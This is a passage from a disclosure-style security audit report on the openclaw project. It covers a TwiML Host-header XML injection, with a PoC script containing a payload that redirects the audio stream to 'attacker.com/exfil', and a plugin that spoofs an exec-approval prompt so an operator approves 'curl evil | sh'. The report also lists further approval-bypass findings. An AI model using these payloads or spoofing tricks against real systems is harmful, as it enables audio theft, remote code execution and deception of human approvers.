</Connect>\\\\n</Response>`;\\\\n```\\\\n\\\\n`req.headers.host` is attacker-controlled. If `this.publicOrigin` is not configured (null/empty), `req.headers.host` flows into the XML without escaping. A crafted `Host:` header like `evil.com\\\\\\" onload=\\\\\\"...` or XML-special chars could inject arbitrary XML attributes into the TwiML response, redirecting the WebSocket stream to an attacker-controlled host.\\\\n\\\\n## Attacker Control\\\\n- Input: HTTP `Host` header on incoming webhook POST\\\\n- Runtime: voice-call extension (Node HTTP server)\\\\n- Boundary: Internet → Twilio webhook handler → TwiML response read by Twilio\\\\n\\\\n## Effect\\\\nIf `publicOrigin` is unset (default when operator has not configured a public URL), any caller reaching the webhook can redirect Twilio audio stream connections to an arbitrary WebSocket host — cross-tenant audio exfiltration.\\\\n\\\\n## Enrichment Classification\\\\n**likely security** — crosses trust boundary (webhook caller controls response consumed by Twilio)\\\\n\\\\n## CodeQL Reachability\\\\nNo slice pre-computed; on-demand analysis required.\\\\n\\\\n---\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/H3-twiml-host-injection/poc.js`\\\\n\\\\nEvidence files:\\\\n- `evidence/env-info.txt` (502 bytes)\\\\n- `evidence/exploit.log` (1219 bytes)\\\\n- `evidence/impact.log` (1535 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.js`)\\\\n\\\\n```js\\\\n#!/usr/bin/env node\\\\n/**\\\\n * PoC: H3 — TwiML Host Injection via HTTP Host header\\\\n *\\\\n * Demonstrates that buildTwiMLPayload() in realtime-handler.ts\\\\n * interpolates req.headers.host verbatim into TwiML XML when\\\\n * this.publicOrigin is null/unset. An attacker supplying a crafted\\\\n * Host header can:\\\\n *   1. Break out of the url=\\\\\\"...\\\\\\" attribute and inject arbitrary XML.\\\\n *   2. Redirect Twilio\'s audio WebSocket to an attacker-controlled host.\\\\n *\\\\n * Strategy: unit-style — instantiate a minimal stub that reproduces\\\\n * exactly the vulnerable template-literal path without needing live\\\\n * Twilio infra.  No network calls are made.\\\\n */\\\\n\\\\n\\\\\\"use strict\\\\\\";\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// Reproduce the verbatim template logic from realtime-handler.ts:332-345\\\\n// ---------------------------------------------------------------------------\\\\n\\\\nconst DEFAULT_HOST = \\\\\\"localhost\\\\\\";\\\\n\\\\n/**\\\\n * Minimal reproduction of buildTwiMLPayload()\\\\n * with publicOrigin=null (operator has not called setPublicUrl).\\\\n */\\\\nfunction buildTwiMLPayload(reqHeaders, streamPathPattern, token) {\\\\n  const host = /* publicOrigin= */ null || reqHeaders.host || DEFAULT_HOST;\\\\n  const wsUrl = `wss://${host}${streamPathPattern}/${token}`;\\\\n  const twiml = `<?xml version=\\\\\\"1.0\\\\\\" encoding=\\\\\\"UTF-8\\\\\\"?>\\\\n<Response>\\\\n  <Connect>\\\\n    <Stream url=\\\\\\"${wsUrl}\\\\\\" />\\\\n  </Connect>\\\\n</Response>`;\\\\n  return {\\\\n    statusCode: 200,\\\\n    headers: { \\\\\\"Content-Type\\\\\\": \\\\\\"text/xml\\\\\\" },\\\\n    body: twiml,\\\\n  };\\\\n}\\\\n\\\\n// ---------------------------------------------------------------------------\\\\n// Attack 1: attribute break-out — inject a second attribute + close tag\\\\n// ---------------------------------------------------------------------------\\\\n\\\\nconst MALICIOUS_HOST_ATTR_BREAK =\\\\n  \'evil.attacker.com/voice/stream/realtime/fake\\\\\\" /><Stream url=\\\\\\"wss://attacker.com/exfil/token123\';\\\\n\\\\nconst SAFE_STREAM_PATH = \\\\\\"/voice/stream/realtime\\\\\\";\\\\nconst SAFE_TOKEN = \\\\\\"legit-token-abc\\\\\\";\\\\n\\\\nconst resultAttrBreak = buildTwiMLPayload(\\\\n  { host: MALICIOUS_HOST_ATTR_BREAK },\\\\n  SAFE_STREAM_PATH,\\\\n  SAFE_TOKEN\\\\n);\\\\n\\\\nconsole.log(\\\\\\"=== Attack 1: XML attribute break Prompt Injection Operator Deception\\\\n\\\\n**Severity**: HIGH\\\\n**Finding ID**: H2\\\\n**Repository**: openclaw/openclaw @ f956d099 (main)\\\\n\\\\n## Disclosure-Ready Report\\\\n\\\\nThis report consolidates the audit\'s draft findings, adversarial review, and PoC evidence for this finding. The full discovery-phase investigation is preserved in the sibling files (`draft.md`, `adversarial-review.md`, `poc.*`, `evidence/`).\\\\n\\\\n---\\\\n\\\\n## Draft Finding\\\\n\\\\n---\\\\nPhase: 10\\\\nSequence: 042\\\\nSlug: approval-prompt-injection-operator-deception\\\\nVerdict: VALID\\\\nRationale: The exec-approval prompt rendered in the channel includes plugin-controlled fields (description / labels) verbatim alongside the actual argv; an attacker can craft prompt text that reads as a benign action while the spawned argv is malicious — operator approval semantically authorises a different action than the displayed one, with no anti-spoof structural binding between display bytes and spawn bytes.\\\\nSeverity-Original: HIGH\\\\nPoC-Status: pending\\\\nPre-FP-Flag: none\\\\nOrigin-Sources:\\\\n  - archon/attack-surface/knowledge-base-report.md (H10 approval-prompt display trust)\\\\n  - archon/probe-workspace/team-02-exec-approval/probe-summary.md (description field is plugin-controlled)\\\\nDebate: archon/chamber-workspace/chamber-02-execution/debate.md\\\\n\\\\n## Summary\\\\nExec-approval channel prompts (Telegram/Discord/etc.) are rendered from a request envelope that contains plugin-controlled string fields — notably `description`, command label, and tool/server name. The actual spawned argv is determined by `resolveWindowsSpawnProgram` and may differ from the human-readable description shown to the operator. The rendering does not apply a strict argv-only template; it does not include a per-session anti-spoof prefix. An attacker controlling a plugin can craft a `description` whose Markdown / Unicode formatting visually overrides the argv preview, yielding operator approval for an action the operator did not intend.\\\\n\\\\n## Location\\\\n- Approval render: `src/infra/exec-approval-channel-runtime.ts` (consumes the request `description` and command label)\\\\n- Approval request producer: plugin-runtime invocations of the exec-approval API (plugin-supplied `description`)\\\\n- Spawn sink: `src/plugin-sdk/windows-spawn.ts` (uses argv from resolution, not from description)\\\\n\\\\n## Attacker Control\\\\nAny installed plugin (low-privilege precondition). The plugin\'s own approval-request invocation supplies the `description` and label.\\\\n\\\\n## Trust Boundary Crossed\\\\nPlugin-supplied display string → channel-rendered operator UI → operator decision → spawn argv (independent of display). The boundary that fails is the implicit assumption that what the operator reads matches what the system spawns.\\\\n\\\\n## Impact\\\\nOperator deception leading to approval of arbitrary commands. Severity HIGH because the precondition is \\\\\\"plugin installed\\\\\\" — which is the default state for any extension user. Not RCE-without-operator (operator approves), but the approval is unwitting.\\\\n\\\\n## Evidence\\\\n- Team-02 evidence-trace: description field is plugin-controlled and rendered without escape/truncation.\\\\n- No anti-spoof marker (e.g., HMAC-tagged display nonce) on prompts.\\\\n- Markdown rendering path passes through Telegram/Discord native formatters which honour bold/strike/code-block, allowing display layout manipulation.\\\\n\\\\n## Reproduction Steps\\\\n1. Plugin requests exec-approval with command `bash -c \'curl evil | sh\'` and description containing Markdown that visually presents `language-server (one-time)` as the dominant text and pushes the argv beneath a code-block fold.\\\\n2. Approval prompt lands in operator\'s channel. Operator reads the prominent description and clicks Approve.\\\\n3. Spawn proceeds with the actual argv. RCE.\\\\n\\\\n## Recommended Fix\\\\n- Strict argv-only render template; treat all plugin-supplied `description` as untrusted and place it in a clearly-delimited \\\\\\"plugin says:\\\\\\" section *after* the canonical argv block.\\\\n- Strip / escape Markdown control characters in plugin-supplied display strings.\\\\n- Add a per-approval anti-spoof prefix (deterministic per-session entropy) so attackers cannot pre-render fake \\\\\\"Approve\\\\\\" UI.\\\\n- Consider hash-binding: the consume step verifies hash(argv,env,cwd) matches the request-time hash (also closes p10-043).\\\\n\\\\n## Cross-References\\\\nPattern AP-CHAMBER02-03. Sibling: p10-043 (TOCTOU between display and spawn).\\\\n\\\\n---\\\\n\\\\n## Debate Transcript (excerpt)\\\\n\\\\n# Review Chamber: chamber-02-execution\\\\n\\\\nCluster: CODE EXECUTION & APPROVAL BYPASS\\\\nDFD Slices: exec-approval gate, plugin LSP/MCP spawn, allowlist parser, dotenv→respawn, hot-reload gen-state, device-pairing→admin\\\\nNNN Range: 040-069\\\\nStarted: 2026-05-06T11:30:00Z\\\\nStatus: ACTIVE\\\\nMode: COMPRESSED/SOLO (synthesizer doubles as ideator/tracer/advocate; pre-traced inputs)\\\\n\\\\n## Chamber Context — Pre-Seeded Inputs\\\\n\\\\n### Probe summaries\\\\n- `archon/probe-workspace/team-02-exec-approval/probe-summary.md` — 15 VALIDATED, 7 INVALIDATED-fragile, 9 NEEDS-DEEPER. Critical: CH-08/PH-11 (`allowShellFallback:true` hardcoded), CH-21 (plugin→MCP subprocess bypass). High: PH-08 (`shouldBlockRuntimeDotEnvKey` always false → NODE_OPTIONS), Windows env-var denylist drift.\\\\n- `archon/probe-workspace/team-01-plugin-trust/probe-summary.md` — 15 VALIDATED. Chain 2 workspace-loaded shadow plugin composes here as ENTRY POINT for any LSP-based exec.\\\\n\\\\n### Existing finding drafts already covering this cluster (DO NOT recreate)\\\\n| Draft | Severity | Topic |\\\\n|-------|----------|-------|\\\\n| p4-001 | HIGH | TwiML host-header XML injection |\\\\n| p4-006 | HIGH | lobster runner unfiltered process.env |\\\\n| p4-008 | MEDIUM | process.env spread (45 sites) |\\\\n| p7-001
